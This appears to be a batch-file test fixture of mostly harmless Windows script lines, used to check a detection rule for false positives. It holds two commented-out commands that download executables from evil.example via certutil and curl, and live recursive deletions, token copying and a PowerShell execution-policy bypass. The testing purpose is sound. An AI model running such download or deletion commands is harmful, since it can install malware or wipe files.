@ECHO OFF
SETLOCAL
REM The MIT licence header of virtualenv's activate.bat. A rule keyed on the
REM bare word 'copy' fails 27 of the 116 real files, on this sentence alone:
REM Permission is hereby granted, free of charge, to any person obtaining a copy
REM of this software and associated documentation files (the "Software"), to deal
REM A payload that is only commented out does not execute:
REM certutil -urlcache -f http://evil.example/p.exe p.exe
:: curl -k -o x.exe https://evil.example/x.exe
SET "PATH=%~dp0;%PATH%"
FOR /F "delims=" %%F IN ('CALL "%NODE_EXE%" "%NPM_PREFIX_JS%"') DO (
  SET "NPM_PREFIX=%%F"
)
FOR /F %%i IN ('powershell -command "Get-Date -f yyyyMMdd"') DO SET STAMP=%%i
SET "MAVEN_HOME=%MAVEN_HOME:~0,-5%"
if "_%EXEC_DIR:~-1%"=="_\" set "EXEC_DIR=%EXEC_DIR:~0,-1%"
SET "GIT_TOKEN=%GITHUB_TOKEN%"
SET "API_KEY=%MY_SERVICE_API_KEY%"
SET /P PASSWORD=Password: 
SET DB_PASSWORD=
IF EXIST build RD /S /Q build
RD /S /Q C:\build\out
DEL /Q /S %BUILDDIR%\*
DEL /F ".\pkg\runtime\runtime_defs.go" 2^>NUL
START /B "Squish Server" %SQUISHSERVER%
"%JAVACMD%" %MAVEN_OPTS% ^
  -classpath "%CLASSWORLDS_JAR%" ^
  %MAVEN_CMD_LINE_ARGS%
CALL :setvars
powershell -ExecutionPolicy Bypass -File setup.ps1
EXIT /B %ERRORLEVEL%
